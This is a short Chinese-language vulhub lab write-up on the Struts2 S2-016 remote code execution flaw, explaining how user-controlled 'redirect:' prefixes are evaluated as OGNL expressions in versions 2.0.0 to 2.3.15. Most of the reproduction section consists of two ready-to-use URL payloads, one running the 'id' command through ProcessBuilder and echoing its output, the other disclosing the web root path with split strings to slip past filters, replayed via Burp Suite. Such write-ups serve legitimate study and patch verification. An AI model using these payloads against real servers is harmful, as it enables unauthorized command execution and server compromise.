# Struts2_016_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行--->有回显

### 0x01漏洞介绍

​		Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。Apache Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts 2.3.15.1以下版本均存在此漏洞。

​			影响版本

  		2.0.0 - 2.3.15

### 0x02漏洞复现

#### payload1(RCE)：

?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'**id**‘)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}

（需要对payload进行url完全编码）

#### payload2(web路径):

redirect%3A%24%7B%23req%3D%23context.get('co'%2B'm.open'%2B'symphony.xwo'%2B'rk2.disp'%2B'atcher.HttpSer'%2B'vletReq'%2B'uest')%2C%23resp%3D%23context.get('co'%2B'm.open'%2B'symphony.xwo'%2B'rk2.disp'%2B'atcher.HttpSer'%2B'vletRes'%2B'ponse')%2C%23resp.setCharacterEncoding('UTF-8')%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print('web')%2C%23ot.print('path%3A')%2C%23ot.print(%23req.getSession().getServletContext().getRealPath('%2F'))%2C%23ot.flush()%2C%23ot.close()%7D

（需要对payload进行url完全编码）

​			**登录界面**

![S2_016_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_016_rce_1.jpg)

​			**Burpsuite改包重放，有回显，发现id被执行**

![S2_016_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_016_rce_2.jpg)

​				**Burpsuite改包重放，发现web路径被爆出**

![S2_016_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_016_rce_3.jpg)



### 0x03参考资料

https://blog.csdn.net/qq_29647709/article/details/84950476
